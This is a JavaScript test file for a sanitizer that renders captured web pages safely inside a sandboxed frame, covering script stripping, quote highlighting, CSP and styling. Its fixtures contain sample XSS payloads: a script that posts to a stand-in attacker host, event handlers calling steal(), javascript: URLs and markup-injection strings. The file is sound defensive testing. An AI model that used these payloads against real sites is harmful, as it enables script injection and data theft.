/**
 * WP4 — rendering an HTML cited source AS HTML, safely.
 *
 * A captured web page used to arrive as `kind: "markdown"`, and the lib's
 * MarkdownBody escapes HTML by design, so the reader was shown the page's raw
 * markup instead of the page. Rendering it properly means running someone
 * else's document inside the studio, so these tests are mostly about what must
 * NOT survive the trip: scripts, event handlers, network access.
 *
 * The frame itself is `sandbox=""` (no scripts, no same-origin). Everything
 * here is the second and third layer — stripping and CSP — so that loosening
 * any one of the three does not by itself make a cited source dangerous.
 */
import { describe, expect, it } from "vitest";

import {
  buildSourceSrcdoc,
  fallbackStylesheet,
  findQuoteRanges,
  highlightQuote,
  looksLikeHtml,
  readDsTokens,
  stripActiveContent,
  textRegions,
} from "../lib/htmlSource.js";

describe("stripActiveContent", () => {
  it("removes scripts and everything in them", () => {
    const out = stripActiveContent(
      '<p>before</p><script>fetch("https://evil.test", {method:"POST"})</script><p>after</p>',
    );
    expect(out).not.toMatch(/<script/i);
    expect(out).not.toContain("evil.test");
    expect(out).toContain("<p>before</p>");
    expect(out).toContain("<p>after</p>");
  });

  it("removes inline event handlers, quoted and bare", () => {
    const out = stripActiveContent(
      `<img src="data:," onerror="steal()"><div onclick='go()'>x</div><b onmouseover=go()>y</b>`,
    );
    expect(out).not.toMatch(/onerror/i);
    expect(out).not.toMatch(/onclick/i);
    expect(out).not.toMatch(/onmouseover/i);
    // The elements themselves survive — only their behaviour is removed.
    expect(out).toContain("<div");
    expect(out).toContain("<b");
  });

  it("removes javascript: and data:text/html URLs", () => {
    const out = stripActiveContent(
      `<a href="javascript:alert(1)">a</a><a href='data:text/html,<script>x</script>'>b</a>`,
    );
    expect(out).not.toMatch(/javascript:/i);
    expect(out).not.toMatch(/data:text\/html/i);
  });

  it("removes nested frames, forms and remote stylesheets", () => {
    const out = stripActiveContent(
      '<iframe src="https://evil.test"></iframe>' +
        '<link rel="stylesheet" href="https://evil.test/x.css">' +
        '<form action="https://evil.test"><input name="a"></form>' +
        "<p>kept</p>",
    );
    expect(out).not.toMatch(/<iframe/i);
    expect(out).not.toMatch(/<link/i);
    expect(out).not.toMatch(/<form/i);
    expect(out).toContain("<p>kept</p>");
  });

  it("leaves ordinary document markup untouched", () => {
    const html = "<h1>Title</h1><p>A <em>cited</em> passage.</p><table><tr><td>1</td></tr></table>";
    expect(stripActiveContent(html)).toBe(html);
  });
});

describe("textRegions", () => {
  it("reports text only, never markup", () => {
    const html = '<p class="x">hello</p>';
    const regions = textRegions(html);
    expect(regions.map((r) => html.slice(r.start, r.end))).toEqual(["hello"]);
  });

  it("treats comments as markup", () => {
    const html = "a<!-- not text -->b";
    const regions = textRegions(html);
    expect(regions.map((r) => html.slice(r.start, r.end))).toEqual(["a", "b"]);
  });
});

describe("findQuoteRanges / highlightQuote", () => {
  it("marks the passage and nothing else", () => {
    const { html, quoteLocated } = highlightQuote(
      "<p>Documentation must be reviewed before submission.</p>",
      "must be reviewed",
    );
    expect(quoteLocated).toBe(true);
    expect(html).toBe(
      "<p>Documentation <mark data-csv-mark>must be reviewed</mark> before submission.</p>",
    );
  });

  it("tolerates re-wrapped whitespace (an OCR'd quote never matches byte-for-byte)", () => {
    const { quoteLocated, html } = highlightQuote(
      "<p>Documentation must\n   be reviewed</p>",
      "must be reviewed",
    );
    expect(quoteLocated).toBe(true);
    expect(html).toContain("<mark data-csv-mark>");
  });

  it("marks each piece when the passage crosses an inline tag", () => {
    const { html, quoteLocated } = highlightQuote("<p>a <em>bold</em> claim</p>", "a bold claim");
    expect(quoteLocated).toBe(true);
    // Three marks, one per text run — and the <em> structure is preserved.
    expect(html.match(/<mark data-csv-mark>/g)).toHaveLength(3);
    expect(html).toContain("<em>");
  });

  it("never matches inside a tag name or attribute", () => {
    // "href" appears only inside markup, so it must not be findable.
    expect(findQuoteRanges('<a href="/x">link</a>', "href")).toBeNull();
    const { html, quoteLocated } = highlightQuote('<a href="/x">link</a>', "href");
    expect(quoteLocated).toBe(false);
    expect(html).toBe('<a href="/x">link</a>');
  });

  it("returns the document unchanged when the quote is absent or empty", () => {
    expect(highlightQuote("<p>x</p>", "not here")).toEqual({
      html: "<p>x</p>",
      quoteLocated: false,
    });
    expect(highlightQuote("<p>x</p>", "   ")).toEqual({ html: "<p>x</p>", quoteLocated: false });
  });
});

describe("buildSourceSrcdoc", () => {
  it("pins a network-denying CSP so a cited source cannot phone home", () => {
    const { srcdoc } = buildSourceSrcdoc({ html: "<p>x</p>" });
    expect(srcdoc).toContain("Content-Security-Policy");
    expect(srcdoc).toContain("default-src 'none'");
    // Inlined images still work (a capture pipeline embeds them); remote ones
    // would leak the reader's IP and the fact this source was opened.
    expect(srcdoc).toContain("img-src data:");
    expect(srcdoc).not.toContain("img-src *");
  });

  it("keeps links from navigating the frame away from the evidence", () => {
    const { srcdoc } = buildSourceSrcdoc({ html: '<a href="https://x.test">y</a>' });
    expect(srcdoc).toContain('<base target="_blank">');
  });

  it("sanitizes and highlights in one pass", () => {
    const { srcdoc, quoteLocated } = buildSourceSrcdoc({
      html: "<script>evil()</script><p>the cited passage</p>",
      quote: "cited passage",
    });
    expect(srcdoc).not.toMatch(/<script>evil/);
    expect(srcdoc).toContain("<mark data-csv-mark>cited passage</mark>");
    expect(quoteLocated).toBe(true);
  });

  it("cannot be broken out of by a quote containing markup", () => {
    // The quote is matched against TEXT and re-inserted as the source's own
    // bytes, so a crafted quote can never inject a tag of its own.
    const { srcdoc } = buildSourceSrcdoc({
      html: "<p>safe</p>",
      quote: '</p><script>alert(1)</script>',
    });
    expect(srcdoc).not.toContain("alert(1)");
  });

  it("inlines DS tokens, escaping anything hostile in them", () => {
    const { srcdoc } = buildSourceSrcdoc({
      html: "<p>x</p>",
      tokens: { "--st-color-text": '#123456', "--st-color-bg": '</style><script>x' },
    });
    expect(srcdoc).toContain("#123456");
    expect(srcdoc).not.toContain("</style><script>");
  });
});

describe("fallbackStylesheet", () => {
  it("styles the unstyled capture without letting it scroll the page sideways", () => {
    const css = fallbackStylesheet();
    // A stripped capture arrives with no stylesheet at all; wide content must
    // scroll inside its own box.
    expect(css).toContain("overflow-x: auto");
    expect(css).toContain("max-width: 100%");
    expect(css).toContain("mark[data-csv-mark]");
    expect(css).toContain("color-scheme: light dark");
  });

  it("caps SVG width but never gives it height:auto", () => {
    // Found on a real capture: `img, svg { max-width:100%; height:auto }`
    // scales a viewBox-only 16px icon to the full container width. SVG must be
    // capped WITHOUT the height rule, or every inline icon becomes a mural.
    const css = fallbackStylesheet();
    expect(css).toMatch(/img,\s*video\s*\{[^}]*height:\s*auto/);
    const svgRule = css.match(/\bsvg\s*\{[^}]*\}/)?.[0] ?? "";
    expect(svgRule).toContain("max-width: 100%");
    expect(svgRule).not.toContain("height");
  });
});

describe("readDsTokens", () => {
  it("reads the live document's tokens and degrades to {} without a DOM", () => {
    expect(readDsTokens(null)).toEqual({});
    expect(readDsTokens({})).toEqual({});
    const fake = {
      documentElement: {},
      defaultView: {
        getComputedStyle: () => ({
          getPropertyValue: (n) => (n === "--st-color-text" ? " #0a0a0a " : ""),
        }),
      },
    };
    expect(readDsTokens(fake)).toEqual({ "--st-color-text": "#0a0a0a" });
  });
});

describe("looksLikeHtml", () => {
  it("recognises html locators, with query/fragment", () => {
    expect(looksLikeHtml("capture/page.html")).toBe(true);
    expect(looksLikeHtml("capture/page.htm?x=1")).toBe(true);
    expect(looksLikeHtml("capture/page.xhtml#frag")).toBe(true);
    expect(looksLikeHtml("corpus/paper.pdf")).toBe(false);
    expect(looksLikeHtml(".graphify/converted/pdf/a.md")).toBe(false);
    expect(looksLikeHtml(null)).toBe(false);
  });
});
